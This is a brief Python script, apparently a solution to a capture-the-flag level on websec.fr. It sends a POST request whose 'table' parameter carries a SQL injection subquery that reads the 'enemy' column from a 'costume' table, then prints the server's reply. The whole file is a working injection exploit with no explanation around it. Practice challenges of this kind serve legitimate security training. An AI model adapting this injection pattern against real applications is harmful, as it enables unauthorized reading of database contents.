#!/usr/bin/env python3
import requests
import time

URL = "https://websec.fr/level11/index.php"
obj = {
    'user_id': '3',
    'table': '(select 3 id,enemy username from costume where id between 1 and 1)',
    'submit': 'Submit'
}

while True:
    res = requests.post(f"{URL}", data=obj)
    print(res.text)
    break